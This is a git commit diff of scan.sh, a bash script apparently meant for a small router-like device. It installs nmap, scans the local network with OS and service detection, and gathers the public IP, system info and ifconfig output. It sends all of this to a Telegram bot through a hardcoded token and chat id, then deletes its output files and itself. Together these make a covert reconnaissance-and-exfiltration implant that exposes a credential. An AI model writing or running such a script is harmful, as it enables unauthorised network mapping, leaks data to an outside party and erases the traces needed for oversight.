b1bdf8f138a94db320f8f6358b37ee72f5c93875
nouseramefounded <100087356+nouseramefounded@users.noreply.github.com>
2023-04-15 15:35:09 +0200

    Update scan.sh

--- scan.sh
+++ scan.sh
@@ -1,40 +1,48 @@
 #!/bin/bash
 wget -q --spider http://google.com
 current_date=$(date "+%d-%m-%Y")
-SCRIPT_PATH="$(realpath "$0")"
-SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"
-echo "Lo script è collocato nella directory: $SCRIPT_DIR"
 if [ $? -eq 0 ]; then
 	echo "Internet ok"
+	
 	# Installing dependencies
 	echo "Install dependencies"
 	opkg update
 	opkg install nmap
+	opkg install curl
 	echo "Dependencies ok"
 	sleep 1
-	# Crea un file di testo sulla scheda SD per memorizzare i risultati
+	
+	# Create a file to save results
 	echo "Start scanning..."
 	nmap_output_file="nmap_scan_$current_date.txt"
 	touch $nmap_output_file
-	# Assegna l'indirizzo IP ottenuto dall'ethernet alla variabile "ip_address"
 	ip_address=$(ip addr show wlan0 | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1)	
+	#Start scanning
 	nmap -sS -O -sV $ip_address/24 >> $nmap_output_file
 	echo "Scanning complete"
-
+	
+	# Get public IP
 	public_ip=$(curl -s https://ifconfig.me/ip)
 	echo "Public ip: $public_ip"
 
-	#send report via telegram
-	token=""
+	# Get system info
+	system_info=$(uname -a)
+
+	# Get ifconfig result
+	ifconfig_output_file="ifconfig_$current_date.txt"
+	touch $ifconfig_output_file
+	ifconfig > $ifconfig_output_file
+	
+	# Send report via telegram
+	token="5506183591:AAEL6myAZ8xZcVsMDzDx6Fgz6gUhTWo-pMk"
 	# chat id
-	chat_id=""
-	# Definisci il percorso completo del file da inviare
+	chat_id="1789487661"
 	filepath1=$nmap_output_file
-	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="$public_ip"
-	# Invia il file alla chat utilizzando il bot di Telegram
+	filepath3=$ifconfig_output_file
+	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip"
+	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="System info: $system_info"
 	curl -F chat_id="$chat_id" -F document=@"$filepath1" "https://api.telegram.org/bot$token/sendDocument"
+	curl -F chat_id="$chat_id" -F document=@"$filepath3" "https://api.telegram.org/bot$token/sendDocument"
 	rm "$filepath1"
-	#rm -r "$SCRIPT_DIR"
-else
-  	echo "Internet not ok"
-fi
+	rm "$filepath3"
+	rm scan.sh
